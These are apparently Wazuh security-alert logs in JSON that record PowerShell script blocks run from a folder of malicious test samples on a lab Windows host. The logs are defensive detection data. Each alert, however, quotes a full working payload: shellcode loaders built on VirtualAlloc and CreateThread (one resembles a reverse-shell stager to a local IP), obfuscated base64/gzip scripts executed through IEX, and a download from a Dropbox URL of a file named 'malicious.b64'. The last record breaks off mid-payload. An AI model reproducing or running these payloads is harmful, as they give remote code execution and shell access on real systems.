{"timestamp":"2026-07-06T02:19:31.707+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":99,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304371.2727220","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:51.4673512Z","eventRecordID":"145171","processID":"3560","threadID":"5864","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$7ge0 = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $7ge0 -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xc3,0x87,0x45,0x98,0xda,0xdf,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x5a,0x13,0x83,0xc2,0x04,0x03,0x5a,0xcc,0x65,0xb0,0x64,0x3a,0xeb,0x3b,0x95,0xba,0x8c,0xb2,0x70,0x8b,0x8c,0xa1,0xf1,0xbb,0x3c,0xa1,0x54,0x37,0xb6,0xe7,0x4c,0xcc,0xba,0x2f,0x62,0x65,0x70,0x16,0x4d,0x76,0x29,0x6a,0xcc,0xf4,0x30,0xbf,0x2e,0xc5,0xfa,0xb2,0x2f,0x02,0xe6,0x3f,0x7d,0xdb,0x6c,0xed,0x92,0x68,0x38,0x2e,0x18,0x22,0xac,0x36,0xfd,0xf2,0xcf,0x17,0x50,0x89,0x89,0xb7,0x52,0x5e,0xa2,0xf1,0x4c,0x83,0x8f,0x48,0xe6,0x77,0x7b,0x4b,0x2e,0x46,0x84,0xe0,0x0f,0x67,0x77,0xf8,0x48,0x4f,0x68,0x8f,0xa0,0xac,0x15,0x88,0x76,0xcf,0xc1,0x1d,0x6d,0x77,0x81,0x86,0x49,0x86,0x46,0x50,0x19,0x84,0x23,0x16,0x45,0x88,0xb2,0xfb,0xfd,0xb4,0x3f,0xfa,0xd1,0x3d,0x7b,0xd9,0xf5,0x66,0xdf,0x40,0xaf,0xc2,0x8e,0x7d,0xaf,0xad,0x6f,0xd8,0xbb,0x43,0x7b,0x51,0xe6,0x0b,0x48,0x58,0x19,0xcb,0xc6,0xeb,0x6a,0xf9,0x49,0x40,0xe5,0xb1,0x02,0x4e,0xf2,0xb6,0x38,0x36,0x6c,0x49,0xc3,0x47,0xa4,0x8d,0x97,0x17,0xde,0x24,0x98,0xf3,0x1e,0xc9,0x4d,0x69,0x1a,0x5d,0xae,0xc6,0x25,0xf1,0x46,0x15,0x26,0x08,0x2a,0x90,0xc0,0x5a,0x04,0xf3,0x5c,0x1a,0xf4,0xb3,0x0c,0xf2,0x1e,0x3c,0x72,0xe2,0x20,0x96,0x1b,0x88,0xce,0x4f,0x73,0x24,0x76,0xca,0x0f,0xd5,0x77,0xc0,0x75,0xd5,0xfc,0xe7,0x8a,0x9b,0xf4,0x82,0x98,0x4b,0xf5,0xd8,0xc3,0xdd,0x0a,0xf7,0x6e,0xe1,0x9e,0xfc,0x38,0xb6,0x36,0xff,0x1d,0xf0,0x98,0x00,0x48,0x8b,0x11,0x95,0x33,0xe3,0x5d,0x79,0xb4,0xf3,0x0b,0x13,0xb4,0x9b,0xeb,0x47,0xe7,0xbe,0xf3,0x5d,0x9b,0x13,0x66,0x5e,0xca,0xc0,0x21,0x36,0xf0,0x3f,0x05,0x99,0x0b,0x6a,0x97,0xe5,0xdd,0x52,0xed,0x07,0xde;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Ysq=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Ysq.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Ysq,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: be0f0abf-a829-4e9b-a479-02d64f0744c2\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2076.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$7ge0 = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $7ge0 -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xc3,0x87,0x45,0x98,0xda,0xdf,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x5a,0x13,0x83,0xc2,0x04,0x03,0x5a,0xcc,0x65,0xb0,0x64,0x3a,0xeb,0x3b,0x95,0xba,0x8c,0xb2,0x70,0x8b,0x8c,0xa1,0xf1,0xbb,0x3c,0xa1,0x54,0x37,0xb6,0xe7,0x4c,0xcc,0xba,0x2f,0x62,0x65,0x70,0x16,0x4d,0x76,0x29,0x6a,0xcc,0xf4,0x30,0xbf,0x2e,0xc5,0xfa,0xb2,0x2f,0x02,0xe6,0x3f,0x7d,0xdb,0x6c,0xed,0x92,0x68,0x38,0x2e,0x18,0x22,0xac,0x36,0xfd,0xf2,0xcf,0x17,0x50,0x89,0x89,0xb7,0x52,0x5e,0xa2,0xf1,0x4c,0x83,0x8f,0x48,0xe6,0x77,0x7b,0x4b,0x2e,0x46,0x84,0xe0,0x0f,0x67,0x77,0xf8,0x48,0x4f,0x68,0x8f,0xa0,0xac,0x15,0x88,0x76,0xcf,0xc1,0x1d,0x6d,0x77,0x81,0x86,0x49,0x86,0x46,0x50,0x19,0x84,0x23,0x16,0x45,0x88,0xb2,0xfb,0xfd,0xb4,0x3f,0xfa,0xd1,0x3d,0x7b,0xd9,0xf5,0x66,0xdf,0x40,0xaf,0xc2,0x8e,0x7d,0xaf,0xad,0x6f,0xd8,0xbb,0x43,0x7b,0x51,0xe6,0x0b,0x48,0x58,0x19,0xcb,0xc6,0xeb,0x6a,0xf9,0x49,0x40,0xe5,0xb1,0x02,0x4e,0xf2,0xb6,0x38,0x36,0x6c,0x49,0xc3,0x47,0xa4,0x8d,0x97,0x17,0xde,0x24,0x98,0xf3,0x1e,0xc9,0x4d,0x69,0x1a,0x5d,0xae,0xc6,0x25,0xf1,0x46,0x15,0x26,0x08,0x2a,0x90,0xc0,0x5a,0x04,0xf3,0x5c,0x1a,0xf4,0xb3,0x0c,0xf2,0x1e,0x3c,0x72,0xe2,0x20,0x96,0x1b,0x88,0xce,0x4f,0x73,0x24,0x76,0xca,0x0f,0xd5,0x77,0xc0,0x75,0xd5,0xfc,0xe7,0x8a,0x9b,0xf4,0x82,0x98,0x4b,0xf5,0xd8,0xc3,0xdd,0x0a,0xf7,0x6e,0xe1,0x9e,0xfc,0x38,0xb6,0x36,0xff,0x1d,0xf0,0x98,0x00,0x48,0x8b,0x11,0x95,0x33,0xe3,0x5d,0x79,0xb4,0xf3,0x0b,0x13,0xb4,0x9b,0xeb,0x47,0xe7,0xbe,0xf3,0x5d,0x9b,0x13,0x66,0x5e,0xca,0xc0,0x21,0x36,0xf0,0x3f,0x05,0x99,0x0b,0x6a,0x97,0xe5,0xdd,0x52,0xed,0x07,0xde;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Ysq=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Ysq.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Ysq,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"be0f0abf-a829-4e9b-a479-02d64f0744c2","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2076.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:31.717+0000","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":11,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304371.2738577","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:52.3022533Z","eventRecordID":"145175","processID":"6064","threadID":"964","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\nif([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAFvQZ1gCA71WbW/aSBD+nEr9D1aFZFslGAhtmkiVbo0xEF4CcTAQik4be20WFi+x1wTo9b/fGOyEKmmV64ezQN7dmdmdfeaZGXtx4AjKA8kzzeDe2BTPDVP6/v7dSQ+HeCkpuaBeO3vYdfXWMC/l1sGAj7w+KqknJ6CTC8nVRVf6KikTtFoZfIlpML28rMZhSAJxmBfqRKAoIst7RkmkqNI/0nBGQnJ6fT8njpC+S7m/C3XG7zFL1bZV7MyIdIoCN5G1uYMTDwvWilGhyN++yerktDQt1B5izCJFtraRIMuCy5isSj/U5MDb7Yoococ6IY+4JwpDGpyVC4Mgwh7pwm5r0iFixt1IVuEa8AuJiMNAOlwo2eEgV2QY9kLuINcNSQTqhWaw5gsCuMSM5aW/lEl6/E0cCLokIBck5CuLhGvqkKjQwIHLyA3xpkqXPGa3fquRcmwEWj0RqnmIymt+drgbM3IwldWXnh6FUoXnp3ACDD/ev3v/zsvosG6dr3mpaAej6JgOMDqZ7McEPFZ6PKJ79a9SMS914GgseLiFae42jIk6lSZJKCbTqZRbdFrdOP/rDUqZNuiyWbk2b9Q2HNYnNqfuFOzSUOU2iytvkwh+zTmDeDQgxjbAS+pktFJeCwDxGNnfuJCpdcE1RU4FxDUIIz4WCaJ5afLSrLak4slWjylzSYgcCGIEXkF81Z+dOQRJkZtBhywBqsNchmB4QGaSaacE3manJ3NQkqsMR1Fe6sWQTU5esghmxM1LKIhoKkKx4Puh/OxuJ2aCOjgS2XZT9QnI9MAqDyIRxg6EDy5/a62IQzFLsMhLDeoSfWtRPztYfhWJKmaMBj7stIZIwEqCgCUSUoTg44EAasEiorlcMbIEpX1imwz7kMZpLuxphH3iyi98zLh+IHYCR4bDkYcQY4txkZdsGgooEAm0T3T6Qy+OCsTBn2pI0qAoWeZM9K1IiJ5bLq35iITNhKEpSHtIQgFwmCFf6jginyuWCAEs5YN2TasInnEzYB1HX9ASeqSlZgf+A3rW5Ma527qaN7TQ2Mw81IyanUbP6DcalfWVZVeEVWuKVq8pOrXRfG6hxs1gLO6aqHFLi4txZbe6ojurjdzxRvu803ePRX2zm/uuNzY8zz/3rJvSJ5O2h9W+XizjtlGL20P9US9Wohp9bPTpoL+4MsX92GZ44Gn+qHSB6aYdzu0S7+yaCNVnZ87uyrPrs467HTe0i2FlgWoIVYOabeq8NdZD1NNs7Nv8seVXcdmvIt10KLnrD0y93zd1NKjPH4wLzQfbEZ7pQ7tM71ajmxnMTXChpRUrTZfs+LgPINU5wv4N6PjVsjPzQMf4iPSPXR6V8ULnSAcd8+4B/BqvzB4D+e2gzJHNuiOM2ndbU9NK414FNYp0WPdRsiX29T5G0drYGVrJdrk7/NQde5o9YueaUb1dOZ6maY8No+XclTZfrs+/tIfUXnI00DT7Q0IOYEduRsZe+Sjgv6rrHRxGM8yACFCvs2Q0eWimZbfHaWKhKMfdeEHCgDDoX9DhMlYjxriTdILjOg3N6NAippCfAxielV8dqdKTovrcJ7Kly8s78BkyJSNyoU0CX8zyxc1ZsQhlvripFOHib79rla+2ytN2+aRVHBA7PoTtD1GTVMqtvYq/7XXvd9f/C6ZpNs/g5b4R0+e130jfhHMxn2LxYv3nhf+E+J8iMcRUgIEFlYmRQ6f8LSApn44+Np5DB3zx0if56LuOxWkXvkT+BTEfe9ZxCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\r\n\r\nScriptBlock ID: 262b40b4-08cf-42e8-a162-542928392c33\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2080.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAFvQZ1gCA71WbW/aSBD+nEr9D1aFZFslGAhtmkiVbo0xEF4CcTAQik4be20WFi+x1wTo9b/fGOyEKmmV64ezQN7dmdmdfeaZGXtx4AjKA8kzzeDe2BTPDVP6/v7dSQ+HeCkpuaBeO3vYdfXWMC/l1sGAj7w+KqknJ6CTC8nVRVf6KikTtFoZfIlpML28rMZhSAJxmBfqRKAoIst7RkmkqNI/0nBGQnJ6fT8njpC+S7m/C3XG7zFL1bZV7MyIdIoCN5G1uYMTDwvWilGhyN++yerktDQt1B5izCJFtraRIMuCy5isSj/U5MDb7Yoococ6IY+4JwpDGpyVC4Mgwh7pwm5r0iFixt1IVuEa8AuJiMNAOlwo2eEgV2QY9kLuINcNSQTqhWaw5gsCuMSM5aW/lEl6/E0cCLokIBck5CuLhGvqkKjQwIHLyA3xpkqXPGa3fquRcmwEWj0RqnmIymt+drgbM3IwldWXnh6FUoXnp3ACDD/ev3v/zsvosG6dr3mpaAej6JgOMDqZ7McEPFZ6PKJ79a9SMS914GgseLiFae42jIk6lSZJKCbTqZRbdFrdOP/rDUqZNuiyWbk2b9Q2HNYnNqfuFOzSUOU2iytvkwh+zTmDeDQgxjbAS+pktFJeCwDxGNnfuJCpdcE1RU4FxDUIIz4WCaJ5afLSrLak4slWjylzSYgcCGIEXkF81Z+dOQRJkZtBhywBqsNchmB4QGaSaacE3manJ3NQkqsMR1Fe6sWQTU5esghmxM1LKIhoKkKx4Puh/OxuJ2aCOjgS2XZT9QnI9MAqDyIRxg6EDy5/a62IQzFLsMhLDeoSfWtRPztYfhWJKmaMBj7stIZIwEqCgCUSUoTg44EAasEiorlcMbIEpX1imwz7kMZpLuxphH3iyi98zLh+IHYCR4bDkYcQY4txkZdsGgooEAm0T3T6Qy+OCsTBn2pI0qAoWeZM9K1IiJ5bLq35iITNhKEpSHtIQgFwmCFf6jginyuWCAEs5YN2TasInnEzYB1HX9ASeqSlZgf+A3rW5Ma527qaN7TQ2Mw81IyanUbP6DcalfWVZVeEVWuKVq8pOrXRfG6hxs1gLO6aqHFLi4txZbe6ojurjdzxRvu803ePRX2zm/uuNzY8zz/3rJvSJ5O2h9W+XizjtlGL20P9US9Wohp9bPTpoL+4MsX92GZ44Gn+qHSB6aYdzu0S7+yaCNVnZ87uyrPrs467HTe0i2FlgWoIVYOabeq8NdZD1NNs7Nv8seVXcdmvIt10KLnrD0y93zd1NKjPH4wLzQfbEZ7pQ7tM71ajmxnMTXChpRUrTZfs+LgPINU5wv4N6PjVsjPzQMf4iPSPXR6V8ULnSAcd8+4B/BqvzB4D+e2gzJHNuiOM2ndbU9NK414FNYp0WPdRsiX29T5G0drYGVrJdrk7/NQde5o9YueaUb1dOZ6maY8No+XclTZfrs+/tIfUXnI00DT7Q0IOYEduRsZe+Sjgv6rrHRxGM8yACFCvs2Q0eWimZbfHaWKhKMfdeEHCgDDoX9DhMlYjxriTdILjOg3N6NAippCfAxielV8dqdKTovrcJ7Kly8s78BkyJSNyoU0CX8zyxc1ZsQhlvripFOHib79rla+2ytN2+aRVHBA7PoTtD1GTVMqtvYq/7XXvd9f/C6ZpNs/g5b4R0+e130jfhHMxn2LxYv3nhf+E+J8iMcRUgIEFlYmRQ6f8LSApn44+Np5DB3zx0if56LuOxWkXvkT+BTEfe9ZxCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);","scriptBlockId":"262b40b4-08cf-42e8-a162-542928392c33","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2080.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:33.168+0000","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":12,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304373.2749865","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:53.0358532Z","eventRecordID":"145179","processID":"6852","threadID":"1720","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\nsal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('TY9NawIxFEX3gv8hDC5ayiRCWxcDImWK4EZLS+lCu5hJ3micTDImL/Px7/t0U5ePe+7hvoct9OmuPINE9jUGhIZvAfkPlLnRYPGRf3g3jDz3oOjUhQlsyfZ36H+SF/IEv1n2DlURDVLYO1/fNaeT6WQWvSFDckJsQyaEMlx515ZuiAG8dBYJ5tI1Iog+wGsXnkdVN+fLcRCV8+to36yiTZVGXi5eVsos5wlpK22AvDOwXUbTWvbEkkNTGC21i+GKErWxnashpe8+4RIhIEu/vWa3Teku4voquan+AA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()\r\n\r\nScriptBlock ID: d1987d08-e70c-4de3-b63e-b5bfb330a597\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2089.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('TY9NawIxFEX3gv8hDC5ayiRCWxcDImWK4EZLS+lCu5hJ3micTDImL/Px7/t0U5ePe+7hvoct9OmuPINE9jUGhIZvAfkPlLnRYPGRf3g3jDz3oOjUhQlsyfZ36H+SF/IEv1n2DlURDVLYO1/fNaeT6WQWvSFDckJsQyaEMlx515ZuiAG8dBYJ5tI1Iog+wGsXnkdVN+fLcRCV8+to36yiTZVGXi5eVsos5wlpK22AvDOwXUbTWvbEkkNTGC21i+GKErWxnashpe8+4RIhIEu/vWa3Teku4voquan+AA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()","scriptBlockId":"d1987d08-e70c-4de3-b63e-b5bfb330a597","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2089.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:33.209+0000","rule":{"level":4,"description":"Powershell script querying system environment variables","id":"91816","mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]},"firedtimes":10,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304373.2753827","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:53.1724407Z","eventRecordID":"145180","processID":"6852","threadID":"1720","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n(New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials\r\n\r\n$url = \"https://dl.dropboxusercontent.com/s/wse5vs3ydkmjqgx/forFunAndProfit.b64?dl=0\"\r\n$file = $env:temp + \"\\malicious.b64\"\r\nInvoke-WebRequest -Uri $url -OutFile $file\r\n\r\nScriptBlock ID: d4df783d-f089-4a1c-a1ac-65040cf3634f\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"(New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials    $url = \\\"https://dl.dropboxusercontent.com/s/wse5vs3ydkmjqgx/forFunAndProfit.b64?dl=0\\\"  $file = $env:temp + \\\"\\\\malicious.b64\\\"  Invoke-WebRequest -Uri $url -OutFile $file","scriptBlockId":"d4df783d-f089-4a1c-a1ac-65040cf3634f"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:34.137+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":100,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304374.2756654","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:53.9549943Z","eventRecordID":"145185","processID":"3816","threadID":"7308","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x95,0x68,0x02,0x00,0x15,0xb3,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: ae86dc93-8520-4fc1-b83f-64053d87ec69\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2095.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0x